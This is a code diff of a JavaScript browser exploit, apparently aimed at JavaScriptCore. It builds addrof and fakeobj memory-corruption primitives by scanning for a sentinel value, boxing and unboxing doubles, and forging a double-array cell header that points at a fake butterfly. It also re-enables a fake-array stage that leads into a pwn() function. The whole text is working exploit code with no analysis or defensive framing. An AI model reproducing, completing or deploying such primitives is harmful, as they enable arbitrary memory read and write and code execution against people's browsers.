@@ -25,8 +25,8 @@ var qwordAsFloat = qword => {
     //data_view.setBigUint64(0, qword);
     return data_view.getFloat64(0, true);
 }
-          // constant added to double JSValues
-          const kBoxedDoubleOffset = 0x0002000000000000;
+// constant added to double JSValues
+          const kBoxedDoubleOffset = 0x0002000000000000n;
           function boxDouble(d) {
             return d + kBoxedDoubleOffset;
           }
@@ -34,7 +34,7 @@ var qwordAsFloat = qword => {
             return d - kBoxedDoubleOffset;
           }
           // the structure ID is wrong, but we'll fix it :)
-          let doubleArrayCellHeader = 0x0108230700000000;
+          let doubleArrayCellHeader = 0x0108230700000000n;
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
           function float2bigint(v) {
@@ -80,14 +80,13 @@ var qwordAsFloat = qword => {
               return;
             }
 
-            const kSentinel = 0x133700001337;
+            const kSentinel = 1333.337;
             let offset = -1;
 
             b1[0] = kSentinel;
             // scan for the sentinel to find the offset from a to b
             for (var i = 0; i < 0x100; i++) {
-              if (qwordAsFloat(qwordAsTagged(a1[i])) == kSentinel) {
-              //qwordAsFloat
+              if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
                 offset = i;
                 break;
               }
@@ -100,22 +99,22 @@ var qwordAsFloat = qword => {
             // temporary implementations
             addrof = (val) => {
               b1[0] = val;
-              return floatAsQword(a1[offset]);
+              return float2bigint(a1[offset]);
             }
             fakeobj = (addr) => {
-              a1[offset] =qwordAsFloat(addr);
+              a1[offset] = bigint2float(addr);
               return b1[0];
             }
 
             let obj = {
-              jsCellHeader: qwordAsTagged(doubleArrayCellHeader),
+              jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
               fakeButterfly: a0
             };
 
             let addr = addrof(obj);
             port.postMessage("obj @ " + addr.toString(16));
 
-            /*let fakeArr = fakeobj(addr + 0x10n);
+            let fakeArr = fakeobj(addr + 0x10n);
 
             // subtract off the incref
             doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
@@ -145,7 +144,8 @@ var qwordAsFloat = qword => {
             addrof = (val) => {
               b1[0] = val;
               return float2bigint(a1[0]);
-            }*/
+            }
+            port.postMessage("We got stableish addrof and fakeobj");
           }
 
           function pwn() {
